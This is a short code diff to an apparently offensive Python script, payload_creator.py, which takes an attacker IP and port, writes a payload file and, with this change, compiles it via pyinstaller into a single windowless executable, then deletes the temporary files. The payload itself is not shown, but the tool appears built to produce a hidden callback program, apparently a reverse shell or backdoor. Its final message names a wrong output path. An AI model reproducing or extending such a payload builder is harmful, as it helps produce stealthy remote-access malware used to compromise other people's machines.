@@ -1,5 +1,7 @@
 import sys
 import os
+import time
+import shutil
 
 if len(sys.argv) != 3:
     print("[-] Invalid Argument! Usage: python payload_creator.py <IP> <PORT>")
@@ -22,4 +24,13 @@ with open('tempPayload.py', 'w') as tempPayload:
     tempPayload.write(data)
     tempPayload.close()
 
-print("[*] Compiling payload to .exe\n\n\n")
+print("[*] Compiling payload to .exe\n")
+os.system("pyinstaller tempPayload.py --onefile --clean --noconsole")
+time.sleep(2)
+
+print("[*] Cleaning up...")
+os.remove("tempPayload.py")
+os.remove("tempPayload.spec")
+shutil.rmtree("build")
+
+print("[+] Successfully created payload! Located in {payload_creator.py directory}/dist/payload.py")
